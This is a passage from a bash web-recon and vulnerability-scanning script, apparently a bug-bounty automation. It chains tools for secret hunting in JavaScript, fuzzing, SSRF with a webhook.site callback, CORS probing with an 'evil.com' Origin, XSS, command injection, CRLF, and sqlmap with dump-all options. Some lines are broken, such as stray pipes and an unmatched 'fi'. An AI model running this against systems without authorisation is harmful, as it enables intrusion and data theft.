	printf "\n${NORMAL}${YELLOW}Discovering sensitive data like apikeys, accesstoken, authorizations, jwt, etc in JavaScript files...${NORMAL}\n\n"
	for url in $(cat ./$dirdomain/js.txt);do
		python3 ~/tools/secretfinder/SecretFinder.py --input $url -o cli | tee -a ./$dirdomain/secrefinder.txt
	done
printf "${GREEN}##################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#####################################\n\n"
printf -e "${GREEN}Fuzzing script using wfuzz, ffuf, and fuzzdb..."
printf "${GREEN}#######################################################################\n\n"
printf
printf " ${bold}${cyan}Directory ${end}${end}${bold}${white}Busting!${end}${end}"
printf
printf " Press ${RED}ctrl+c${end} to stop the dir busting tool."
printf
#gobuster dir -u "https://$dirdomain/" -w $fuzz_file -q --random-agent | tee ./$dirdomain/fuzzing/directory.txt
#ffuf -u https://$dirdomain/FUZZ -w $fuzz_file -mc 200 -c -v >> ./$dirdomain/fuzzing/directory.txt
printf " ${bold}${YELLOW}[RUNNING]${end}${end}"
printf "${GREEN}######################################${end} ${bold}${RED}Done.${end}${end}" |
printf

# Fuzzing script using wfuzz, ffuf, and fuzzdb

# Function to check if the tool is installed
check_installed() {
  if ! command -v $1 &> /dev/null
  then
      printf "$1 could not be found. Please install it and try again."
      exit
  fi
}



# Run wfuzz
printf "[*] Running wfuzz..."
#wfuzz -w $fuzz_file -u http://$dirdomain/FUZZ -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" --hc 404 -t 50 -o ${dirdomain}/fuzzing/wfuzz.txt

# Run ffuf
printf "[*] Running ffuf..."
#ffuf -w $fuzz_file -u http://$dirdomain/FUZZ -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -fc 404 -c -t 50 -o ${dirdomain}/fuzzing/ffuf.txt

# Check if fuzzdb is installed and clone it if not
# if [ ! -d "fuzzdb" ]
# then
#     printf "[*] Cloning fuzzdb repository..."
#     git clone https://github.com/fuzzdb-project/fuzzdb.git
# fi

# Run fuzzdb
# printf "[*] Running fuzzdb..."
# fuzzdb_dir=$(pwd)/fuzzdb/
# ffuf -w $fuzzdb_dir/attack-payloads/Injections/SQL.txt -u http://$dirdomain/FUZZ -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -fc 404 -c -t 50 -o ${dirdomain}/fuzzing/fuzzdb.txt


# Run linkfinder
# printf "[*] Running LinkFinder on subdomains..."
# while read subdomain; do
#     printf "[*] Running LinkFinder on $subdomain"
#    python3 ~/tools/LinkFinder/linkfinder.py -i "$subdomains_live" -d -o cli >> ${dirdomain}/fuzzing/links.txt
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Parameter discovery  ..."
printf "${GREEN}#######################################################################\n\n"
cat ./$dirdomain/crawling.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/xss.txt
cat ./$dirdomain/crawling.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssrf.txt
cat ./$dirdomain/crawling.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/sqli.txt
cat ./$dirdomain/crawling.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/lfi.txt
cat ./$dirdomain/crawling.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/rce.txt
cat ./$dirdomain/crawling.txt | gf REDirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/openREDirect.txt 
cat ./$dirdomain/crawling.txt | gf http-auth | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/http-auth.txt
cat ./$dirdomain/crawling.txt | gf idor | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/idor.txt
cat ./$dirdomain/crawling.txt | gf debug_logic | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/debug_logic.txt




# Parameth
printf "[*] Running Parameth..."
# python3 /opt/Parameth/parameth.py -d $dirdomain -o ${dirdomain}/parameters/parameth.txt > /dev/null 2>&1

# Arjun
printf "[*] Running Arjun..."
#arjun -u https://$dirdomain -o $dirdomain/parameters/arjun.txt > /dev/null 2>&1

# x8
printf "[*] Running x8..."
#x8 -target https://$dirdomain -all > $dirdomain/parameters/x8.txt

printf "[+] Parameter discovery complete! Output saved to:./${dirdomain}/parameters/"
printf "${GREEN}######################################${end} ${bold}${RED}Done.${end}${end}" |


printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: Missing headers${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: Missing headers${NORMAL}\n"
	printf "${NORMAL}${YELLOW}Cheking security headers...${NORMAL}\n\n"
	python3 ~/tools/magicRecon/shcheck/shcheck.py $domainName | tee ./${dirdomain}/vulnerability/headers.txt | grep 'Missing security header:\|There are\|--'
printf "${GREEN}##################################${end} ${bold}${RED}Done.${end}${end}" |	
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: Email spoofing ${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"	
printf "${NORMAL}${YELLOW}Cheking SPF and DMARC record...${NORMAL}\n\n"
mailspoof -iL $subdomains_live | tee ./${dirdomain}/vulnerability/spoof.json
printf "${GREEN}###################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: 403 bypass ${NORMAL}\n"
printf "${GREEN}###############################################\n\n"	
printf "${NORMAL}${YELLOW}Gathering endpoints that they return 403 status code...${NORMAL}\n\n"
cat ./$dirdomain/crawling.txt |  httpx -silent -sc -title | grep 403 | grep "$domain" | cut -d' ' -f1 | tee ./$dirdomain/endpoints_403.txt

	printf "\n${NORMAL}${CYAN}Trying to bypass 403 status code...${NORMAL}\n\n"
	for url in $(cat ./$dirdomain/endpoints_403.txt);
	do
		domainAWK=$domain":443"
		endpoint=$(printf $url | awk -F $dirdomainAWK '{print $2}') 
		if [ -n "$endpoint" ]
		then
	      		python3 ~/tools/403bypass/4xx.py $dirdomainAWK $endpoint | tee -a ./$dirdomain/vulnerability/bypass403.txt
		fi
	done
printf "${GREEN}###############################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability:  Server Side Template Injection ${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"
#for url in $(cat ./$dirdomain/parameters/xss.txt);do
#tinja url -u $url
#	done



printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability:  Cross Site Request Forgery (CSRF/XSRF) ${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"
printf "${NORMAL}${YELLOW}Checking all known misconfigurations in CSRF/XSRF implementations...${NORMAL}\n\n"
python3 ~/tools/Bolt/bolt.py -u $domainName -l 2 | tee -a ./${dirdomain}/vulnerability/csrf.txt
#for url in $(cat ./$dirdomain/parameters/ssrf.txt);do
#xsrfprobe -u $url -o ./${dirdomain}/vulnerability/xsrfprobe.txt
#	done

printf "${GREEN}############################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: Open REDirect ${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"
printf "${NORMAL}${YELLOW}Finding Open REDirect entry points in the domain...${NORMAL}\n\n"
cat ./$dirdomain/crawling.txt | gf REDirect archive | qsreplace | tee ./${dirdomain}/vulnerability/or_urls.txt
	printf "\n"
	printf "${NORMAL}${YELLOW}Checking if the entry points are vulnerable...${NORMAL}\n\n"
	cat ./${dirdomain}/vulnerability/or_urls.txt | qsreplace "https://google.com" | httpx -silent -status-code -location
	cat ./${dirdomain}/vulnerability/or_urls.txt | qsreplace "//google.com/" | httpx -silent -status-code -location
	cat ./${dirdomain}/vulnerability/or_urls.txt | qsreplace "//\google.com" | httpx -silent -status-code -location


printf "${GREEN}####################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf "\n${GREEN}[+] Vulnerability: Multiples vulnerabilities ${NORMAL}\n"
printf "${GREEN}#######################################################################\n\n"
nuclei -l $subdomains_live | tee ./$dirdomain/vulnerability/vul_scan.txt






printf "${GREEN}##################################${end} ${bold}${RED}Done.${end}${end}" |

printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}find SSRF vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
cat ./$dirdomain/crawling.txt | gf ssrf | qsreplace http://$LISTENSERVER | httpx -silent 
notify -bulk -data ./$dirdomain/listen_server.txt -silent

interactsh-client & >./$dirdomain/ssrf_callback.txt &
COLLAB_SERVER_URL="https://webhook.site/ac66505b-073d-4f62-b8ea-c7bed4b17e02"
cat ${dirdomain}/parameters/ssrf.txt | qsreplace ${COLLAB_SERVER_URL} | httpx -threads 500 -mc 200 |tee ./$dirdomain/tmp_ssrf.txt

printf "[]  SSRF vulnerability testing completed"
printf "${GREEN}#####################################${end} ${bold}${RED}Done.${end}${end}" |
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}find CORS vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
 cat ./$dirdomain/crawling.txt | qsreplace  -a | httpx -silent -threads 500 -mc 200 | CorsMe - t 70 -output ./$dirdomain/vulnerability/cors_result.txt
 # Read URLs from the file into an array
 mapfile -t urls < "$url_file"

# Create or clear the report file
 > "cors_file"

for url in "${urls[@]}"
do
    # Send a request with a custom Origin header
 response=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: https://evil.com" "$url")

  if [ "$response" == "200" ]; then
        printf "${RED}Vulnerable to CORS Misconfiguration: $url"
       printf "${RED}Vulnerable to CORS Misconfiguration: $url" >> "$cors_file"
  else
     printf "${GREEN}Not Vulnerable to CORS Misconfiguration: $url"
 fi
done

 
printf "[]  CORS vulnerability testing completed"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}find Xss vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
printf "${GREEN}#######################################################################\n\n"
cat ${dirdomain}/parameters/xss.txt | qsreplace FUZZ | sed '/FUZZ/!d' | Gxss -c 100 -p Xss | qsreplace FUZZ | sed '/FUZZ/!d' | anew -q ${dirdomain}/vulnerability/gxss.txt

cat ${dirdomain}/vulnerability/gxss.txt | dalfox pipe --silence --no-color --no-spinner --only-poc r --ignore-return 302,404,403 --skip-bav -b ${COLLAB_SERVER_URL} -w 200  | anew -q ${dirdomain}/vulnerability/xss_result.txt -silent

printf "[]  Xss vulnerability testing completed"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Refactors_xss vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
cat ${dirdomain}/parameters/xss.txt | Gxss -o ${dirdomain}/vulnerability/gxss.txt
cat ${dirdomain}/parameters/xss.txt | kxss | tee -a ${dirdomain}/vulnerability/kxss_url.txt
cat ${dirdomain}/vulnerability/kxss_url.txt | sed 's/.*on//' | sed 's/=.*/=/' > ${dirdomain}/vulnerability/kxss_url_active.txt
cat ${dirdomain}/vulnerability/kxss_url_active.txt | dalfox pipe | tee ${dirdomain}/vulnerability/kxss_dalfoxss.txt
cat ${dirdomain}/vulnerability/gxss.txt | dalfox pipe | tee ${dirdomain}/vulnerability/gxss_dalfoxss.txt
cat ${dirdomain}/parameters/xss.txt | findom-xss.sh

printf "${GREEN}####################################${end} ${bold}${RED}Done.${end}${end}" |


printf "${GREEN}#######################################################################\n\n"  
printf -e "${GREEN}find Xss vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
 # Filter URLs based on "=" character
filteRED_urls=$(grep "=" "$url_file")

# Read filteRED URLs into an array
mapfile -t urls <<< "$filteRED_urls"

# Read file paths from the file into an array
mapfile -t files < "$file_list"
  # Create or clear the report file
> "$report_file"

for url in "${urls[@]}"
do
    for file in "${files[@]}"
    do
        # Replace what comes after "=" with the content of file_list
        replaced_url="${url%=*}=${file}"
        
        full_url="${replaced_url}"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")

        if [ "$response" == "200" ]; then
            printf -e "[-] Testing: $full_url${RED}Vulnerable to XSS:"
            printf "${RED}Vulnerable to XSS: $full_url" >> "$report_file"
        else
            printf -e "[-] Testing:$full_url${GREEN}Not Vulnerable to XSS: "
        fi
    done
done
  printf -ne "${GREEN}[[*]] Vulnerabilities Scanned  -  ${GREEN}XSS Found: ${GREEN}$(cat $report_file 2> /dev/null | wc -l )"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}find Prototype Pollution vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
cat ./$dirdomain/crawling.txt | qsreplace  -a | httpx -silent -threads 500 -mc 200 | ppmap | tee ./${dirdomain}/vulnerability/prototype_pollution_result.txt
printf "[] Prototype Pollution testing completed"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Open REDirect vulnerability scan..."
printf "${GREEN}#######################################################################\n\n"
# Run Oralyzer
printf ${RED}"[*] Running Oralyzer..."
python3 ~/tools/Oralyzer/oralyzer.py -l $subdomains_live -p /root/tools/Oralyzer/payloads.txt | tee ./${dirdomain}/vulnerability/oralyzer.txt

# Run Injectus
printf "${RED}[*] Running Injectus..."
python3 ~/tools/Injectus/Injectus.py -f ./${dirdomain}/parameters/openREDirect.txt | tee  ./${dirdomain}/vulnerability/injectus.txt

# Run dom-RED
printf "${RED}[*] Running dom-RED..."
python3 ~/tools/dom-RED/dom-RED.py -d "$subdomains_live" -i -p /root/tools/dom-RED/payloads.list -v -o "${dirdomain}/vulnerability/dom-RED.txt" >/dev/null
# Consolidate results
printf "[*] Consolidating results..."
cat "${dirdomain}/vulnerability/oralyzer.txt" "./${dirdomain}/vulnerability/injectus.txt" "./${dirdomain}/vulnerability/dom-RED.txt" | sort -u > "${dirdomain}/vulnerability/results.txt"

# Check for open REDirects
printf "[*] Checking for open REDirects..."
grep -E "(http(s)?://)|(/)|(\.\.)" "./${dirdomain}/vulnerability/results.txt" | while read url
do
    # Check if the URL is vulnerable to open REDirect
    if curl -Is "$url" | grep -q "Location: $domain"
    then
        printf "[+] Open REDirect vulnerability found: $url"
    fi
done

printf "[*] Open REDirect scan completed!"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Subtakeover vulnerability scan..."
printf "${GREEN}#######################################################################\n\n"

#cat ./$dirdomain/livesubdomain.txt | nuclei -silent -nh -tags takeover -severity info,low,medium,high,critical -retries 3 -o ./${dirdomain}/vulnerability/nucleiSubtakeover.txt
printf "[*] Subtakeover scan completed!"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}BrokenLinks vulnerability scan..."
printf "${GREEN}#######################################################################\n\n"
katana -silent -list $dirdomain/crawling.txt -jc -kf all -d 3 -o ./${dirdomain}/vulnerability/BrokenLinks.txt 
printf "[*] BrokenLinks scan completed!"


printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}command_injection vulnerability scan..."
printf "${GREEN}#######################################################################\n\n"
printf "[*] Running Commix..."
#commix --url "https://$domain" --all --output-dir "$dirdomain/commix" > /dev/null 2>&1
commix --batch -m ${dirdomain}/parameters/rce.txt --output-dir ${dirdomain}/vulnerability/command_injection.txt
printf "[*] Command Injection scan completed."

printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}crlf_injection vulnerability scan..."
printf "${GREEN}#######################################################################\n\n"
    # run crlfuzz
crlfuzz -l "$subdomains_live" -v -o ${dirdomain}/vulnerability/crlfuzz.txt
    
    # run CRLFsuite
crlfsuite -iT "$subdomains_live" -oN ${dirdomain}/vulnerability/crlfsuite.txt
printf "CRLF injection completed successfully. Results can be found in ${dirdomain}/vulnerability/crlf_injection directory."
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Insecure Direct Object References..."
printf "${GREEN}#######################################################################\n\n"
# Insecure Direct Object References

printf "${YELLOW}[] Running Autorize for insecure direct object references..."
printf "${YELLOW}[] Finding all URLs from $domain ..."
cat ./$dirdomain/crawling.txt | grep -E '\.json$|\.yaml$|\.xml$|\.action$|\.ashx$|\.aspx$|\.php$|\.phtml$|\.do$|\.jsp$|\.jspx$|\.wss$|\.do$|\.action$|\.htm$|\.html$|\.xhtml$|\.rss$|\.atom$|\.ics$|\.csv$|\.tsv$|\.pdf$|\.swf$|\.svg$|\.woff$|\.eot$|\.woff2$|\.tif$|\.tiff$|\.bmp$|\.png$|\.gif$|\.jpg$|\.jpeg$|\.webp$|\.ico$|\.svgz$|\.ttf$|\.otf$|\.mid$|\.midi$|\.mp3$|\.wav$|\.avi$|\.mov$|\.mpeg$|\.mpg$|\.mkv$|\.webm$|\.ogg$|\.ogv$|\.m4a$|\.m4v$|\.mp4$|\.flv$|\.wmv$' > "$dirdomain/all_urls.txt"
printf "${YELLOW}[] Running Autorize for all URLs..."
autorize -i "$dirdomain/all_urls.txt" -t 60 -c 100 -o "${dirdomain}/vulnerability/autorize-results.txt"

printf "${YELLOW}[] Insecure Direct Object References scan completed!"

printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Scan XXE Injection Vulnerability ..."
printf "${GREEN}#######################################################################\n\n"
# Run ground-control
printf "[*] Running ground-control..."
#python3 ~/tools/ground-control/ground-control.py "$target_url" > "${dirdomain}/vulnerability/ground-control.txt"

# Run dtd-finder
printf "[*] Running dtd-finder..."
#dtd-finder "$target_url" > "${dirdomain}/vulnerability/dtd-finder.txt"

printf "[*] XXE Injection scan completed!"

printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Race condition testing ..."
printf "${GREEN}#######################################################################\n\n"
printf "[] Starting race condition testing..."

# razzer
printf "[] Running razzer..."
#razzer --url "$dirdomain" --cookie "sessionid=1" --threads 10 -o "${dirdomain}/vulnerability/razzer.txt"

# racepwn
printf "[] Running racepwn..."
# racepwn -u "$dirdomain" -o "${dirdomain}/vulnerability/racepwn.txt"

printf "[] Race condition testing completed!"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Scan for SQL injection vulnerability..."
printf "${GREEN}#######################################################################\n\n"
# Run sqlmap for basic SQL injection detection
printf "[*] Running sqlmap for basic SQL injection detection..."
sqlmap -u "https://$domain" --batch --level 1 --risk 1 -o -f -a | tee "${dirdomain}/vulnerability/sqlmap-basic.txt"

# Run sqlmap for more advanced SQL injection detection
printf "[*] Running sqlmap for advanced SQL injection detection..."
sqlmap -u "https://$domain" --batch --level 5 --risk 3 -o -f -a | tee "${dirdomain}/vulnerabilitysqlmap-advanced.txt"
printf "[*] SQL injection scanning completed!"
printf "${GREEN}#######################################################################\n\n"
printf -e "${GREEN}Scan With Vulnerability Scanners..."
printf "${GREEN}#######################################################################\n\n"

# Run Nuclei
printf "Running Nuclei..."
nuclei -update-templates -silent -o ${dirdomain}/vulnerability/nuclei_report.txt $dirdomain

# Run Sn1per
printf "Running Sn1per..."
sniper -f $subdomains_live -m massvulnscan -w $workspace > ${dirdomain}/vulnerability/SNIPER_REPORT
fi
